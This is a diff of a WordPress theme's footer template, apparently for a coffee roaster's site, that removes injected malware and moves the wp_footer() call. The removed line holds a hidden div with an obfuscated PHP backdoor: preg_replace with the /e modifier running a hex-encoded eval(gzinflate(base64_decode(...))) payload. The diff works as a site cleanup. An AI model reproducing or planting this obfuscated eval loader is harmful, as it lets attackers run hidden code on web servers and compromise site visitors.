@@ -1,5 +1,5 @@
     </div><!-- #main -->	   
-</div><div style="position:absolute; width:745px; height:1px; overflow:hidden;"><?php preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'xVTBTsMwDL0j8Q/VtANcpjVxmlYTf7LL2qaCaTvC+vn4xTYNUhE7wcGK4+Q5z89JtvObm3pXVbuXanOc/cSW2Abx4/44N62MDkY89xLD3I8yIhYDm2OfsYGxTceWZIyMc8Cw73vNxbZn/P60jo84Jwi2US5feUoeg+QingfeHzgHcYwYEzgeSPKVa4ZxTusjNdTEfNwkFjvhAE7ZEItiwDW1xnmPS8BvDo8P2/nyGtubiYrNriyID43N4udiee6dJVlERxPyASZmr6I7LSDJWIqXCScVCHhSgipcFoPXSAUJTeGjOcyXWhWOVMRJYqRYxLEvjMrhzry5AYjV0pDs+5UmdUX+TkSt6/N7Z6KWN+lPb5EVQMW+pHP4tc4hRCGA5ff1/3HHOmLgR0lEvY7D7WyigixZN0i6QKPGrTtUFENLMVYIiOUighQQ9flk4r99GZi3eoP9SqF3Cpf323P132//Wi47Lz/pafnqfqoDOPkqN4f0cbo8bfUb3VX29uHJhYWXVX4+fAI='\x29\x29\x29\x3B",""); ?></div><!-- #wrapper -->
+</div><!-- #wrapper -->
 <div id="footer">
     <div id="bottomNavigation">
         <a href="<?php echo get_site_url( $blog_id = null, $path = 'our-roasts', $scheme = null ); ?>" id="roastsLink" class="navLinks">
@@ -54,7 +54,7 @@
                 <div style="clear:both;"></div>
  			</div><!-- #colophon -->
         </div>
-	        
+	      <?php wp_footer(); ?>  
 </div><!-- #footer -->
 <script>
 jQuery(document).ready(function($) {
@@ -281,6 +281,5 @@ $('.roastBox').hover(
     var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
   })();
 </script>
-<?php wp_footer(); ?>
 </body>
 </html>
